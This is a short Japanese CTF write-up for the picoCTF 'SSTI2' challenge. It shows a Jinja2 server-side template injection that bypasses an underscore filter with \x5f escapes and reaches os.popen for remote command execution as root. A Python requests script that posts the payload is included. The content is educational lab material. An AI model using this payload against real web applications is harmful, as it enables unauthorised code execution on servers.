---
title: 'SSTI2 - picoCTF'
description: 'SSTI2のWriteupです。'
pubDate: 2025-12-22
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'SSTI']
---

# SSTI2 - picoCTF

## 初期調査
{{7*7}}は実行された

## 対策の観察
{{config.items()}}や一部のPayloadはサーバーエラーになった。\
{{request}}が成功し、request.applicationなどを使用してRCEを狙う。

`__globals__` や `__builtins__` といった文字列はエスケープ (\x5f) で突破した。

## 検証したPayload
[SSTI Payload](https://github.com/payloadbox/ssti-payloads/blob/master/Intruder/ssti-payloads.txt)

### ヒットしたPayload

```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}} 

uid=0(root) gid=0(root) groups=0(root)
```

## exploit

```python
import requests
from urllib.parse import *

URL = "http://challenge-host"
endpoint = "/announce"

# r""を使用しないとpython実行時にpyhon側でエスケープされ失敗する
data = {
  "content": r"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"
}

req = requests.post(urljoin(URL, endpoint), data=data)

print(req.text)
```